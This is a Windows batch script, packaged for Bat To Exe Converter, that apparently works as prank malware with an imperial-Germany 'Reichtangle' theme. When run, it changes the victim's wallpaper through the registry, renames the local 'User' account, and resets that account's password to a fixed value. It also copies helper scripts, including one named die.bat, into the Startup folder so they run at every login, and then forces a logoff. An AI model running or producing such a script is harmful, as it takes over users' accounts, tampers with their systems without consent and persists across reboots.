::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL3e07eGNOEd7UnhSYUiw2hZndgwBRhXMBuoYW8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIiLRJXRBCDMmy2A9U=
::eg0/rx1wNQPfEVWB+kM9LVsJDDanFUiSMpQyz8Teoc+/hy0=
::fBEirQZwNQPfEVWB+kM9LVsJDDaHNWiyErQS7+T+oc+fpy0=
::cRolqwZ3JBvQF1fEqQI3PQ9RQkSWPWza
::dhA7uBVwLU+EWF6R4Ec+aA9VS2Q=
::YQ03rBFzNR3SWATE81ckLRUUWAWFXA==
::dhAmsQZ3MwfNWATE81ckLRUUWAWFXA==
::ZQ0/vhVqMQ3MEVWAtB9wLw5ASQrCKGq9Zg==
::Zg8zqx1/OA3MEVWAtB9wLw5ASQrCKGq9Zg==
::dhA7pRFwIByZRRmD4VY1JltATQPi
::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL3e07eGNOEd7UnhSYQo33lSjMoCCxddMBeza28=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title guten tag
cd sources
start vidplay.bat
msg * guten tag
msg * guten tag
msg * guten tag
msg * guten tag
msg * guten tag
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %USERPROFILE%\Desktop\Reichtangle\reichtangle.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
wmic useraccount where name='User' rename GUTENTAG
net user User imperialgermany1
msg * Your password is now imperialgermany1, incase you cant login.
cd bc
copy * "C:\ProgramData\Microsoft\User Account Pictures"
cd ..
copy vidplay.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy die.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Press ENTER to sign out.
msg * Do you want to sign out to apply changes? Also check cmd.
pause
logoff

